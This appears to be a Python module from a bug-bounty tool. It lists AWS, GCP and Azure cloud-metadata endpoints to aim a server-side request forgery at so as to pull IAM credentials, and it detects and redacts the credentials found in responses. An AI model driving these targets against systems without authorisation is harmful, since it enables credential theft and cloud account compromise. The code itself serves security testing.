"""Cloud-metadata SSRF chain helpers.

When an in-band SSRF returns the fetched body, pointing it at the cloud metadata
service (AWS IMDS / GCP / Azure) can return live IAM credentials — turning a
medium SSRF into a critical "SSRF -> credential theft -> account compromise" chain,
one of the highest-impact bug-bounty outcomes.

Credentials are detected by structure and REDACTED — we never surface or persist the
raw secret material.
"""

import re
from typing import Any, Dict, List

# Metadata endpoints to drive an in-band SSRF at. AWS first (most common); the role
# listing is fetched first, then per-role credentials in the agent flow.
IMDS_TARGETS: List[str] = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
]


def _redact(value: str) -> str:
    if not value:
        return ""
    if len(value) <= 6:
        return value[:2] + "***"
    return f"{value[:4]}...{value[-2:]} (len {len(value)})"


def extract_credentials(body: str) -> List[Dict[str, Any]]:
    """Detect cloud credentials in a (metadata) response body. Returns a list of
    {provider, kind, redacted} — raw secrets are never included."""
    if not body:
        return []
    out: List[Dict[str, Any]] = []

    # AWS IMDS: JSON containing AccessKeyId AND SecretAccessKey.
    ak = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', body)
    sk = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', body)
    if ak and sk:
        out.append(
            {
                "provider": "aws",
                "kind": "iam_credentials",
                "redacted": f"AccessKeyId={_redact(ak.group(1))}; SecretAccessKey=<redacted>",
            }
        )
        return out

    # GCP metadata token endpoint: access_token + token_type, no AWS markers.
    gtok = re.search(r'"access_token"\s*:\s*"([^"]+)"', body)
    if gtok and ("token_type" in body or "expires_in" in body) and "resource" not in body:
        out.append(
            {
                "provider": "gcp",
                "kind": "oauth_token",
                "redacted": f"access_token={_redact(gtok.group(1))}",
            }
        )
        return out

    # Azure IMDS token endpoint: access_token + resource.
    atok = re.search(r'"access_token"\s*:\s*"([^"]+)"', body)
    if atok and "resource" in body:
        out.append(
            {
                "provider": "azure",
                "kind": "oauth_token",
                "redacted": f"access_token={_redact(atok.group(1))}",
            }
        )
    return out
